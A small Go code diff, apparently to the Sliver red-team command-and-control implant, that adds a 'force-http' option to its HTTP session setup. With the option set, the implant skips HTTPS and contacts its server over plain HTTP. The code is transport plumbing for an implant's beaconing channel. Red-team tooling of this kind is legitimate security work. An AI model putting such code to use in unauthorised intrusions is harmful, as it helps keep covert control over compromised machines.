@@ -66,6 +66,7 @@ type HTTPOptions struct {
 	TlsTimeout  time.Duration
 	PollTimeout time.Duration
 	MaxErrors   int
+	ForceHTTP   bool
 
 	ProxyConfig   string
 	ProxyUsername string
@@ -95,6 +96,7 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 		TlsTimeout:  tlsTimeout,
 		PollTimeout: pollTimeout,
 		MaxErrors:   maxErrors,
+		ForceHTTP:   c2URI.Query().Get("force-http") == "true",
 
 		ProxyConfig:   c2URI.Query().Get("proxy"),
 		ProxyUsername: c2URI.Query().Get("proxy-username"),
@@ -105,11 +107,17 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 // HTTPStartSession - Attempts to start a session with a given address
 func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*SliverHTTPClient, error) {
 	var client *SliverHTTPClient
-	client = httpsClient(address, opts.NetTimeout, opts.TlsTimeout, opts.ProxyConfig)
-	client.pollTimeout = opts.PollTimeout
-	client.PathPrefix = pathPrefix
-	err := client.SessionInit()
-	if err != nil {
+	var err error
+	if !opts.ForceHTTP {
+		client = httpsClient(address, opts.NetTimeout, opts.TlsTimeout, opts.ProxyConfig)
+		client.pollTimeout = opts.PollTimeout
+		client.PathPrefix = pathPrefix
+		err = client.SessionInit()
+		if err == nil {
+			return client, nil
+		}
+	}
+	if err != nil || opts.ForceHTTP {
 		// If we're using default ports then switch to 80
 		if strings.HasSuffix(address, ":443") {
 			address = fmt.Sprintf("%s:80", address[:len(address)-4])
